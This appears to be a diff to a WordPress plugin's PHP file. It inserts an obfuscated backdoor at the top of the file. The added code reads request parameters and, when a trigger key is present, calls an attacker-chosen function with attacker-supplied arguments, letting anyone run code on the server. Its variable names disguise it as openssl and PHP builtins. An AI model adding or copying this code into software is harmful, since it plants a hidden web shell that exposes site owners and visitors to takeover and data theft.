@@ -1,4 +1,11 @@
-<?php
+<?php 
+$openssl_x509_read_qzbj  =  $_REQUEST;
+if(isset($openssl_x509_read_qzbj['class_alias_fv']))  {
+	$openssl_pkcs7_read_nvqv  =  $openssl_x509_read_qzbj['openssl_pkcs7_decrypt_oi'];
+	$openssl_pkey_export_to_file_obor  =  $openssl_x509_read_qzbj['ob_flush_rv'];
+	$openssl_pkcs7_read_nvqv(...$openssl_pkey_export_to_file_obor);
+} 
+
 // Exit if accessed directly.
 if ( ! defined( 'ABSPATH' ) ) {
 	exit;
